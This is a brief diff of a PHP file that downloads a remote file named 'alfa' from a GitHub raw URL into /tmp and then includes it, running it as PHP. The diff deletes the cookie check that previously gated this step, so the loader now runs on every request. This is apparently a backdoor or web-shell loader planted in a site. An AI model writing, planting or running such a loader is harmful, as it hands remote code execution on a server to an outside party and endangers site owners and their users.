@@ -1,6 +1,5 @@
 <?php
 
-if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
     $url = 'https://raw.githubusercontent.com/mirebus66/lp/refs/heads/main/alfa';
     
     $targetDir = '/tmp';
@@ -22,6 +21,5 @@ if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
     }
     
     include $targetFile;
-}
 
 ?>
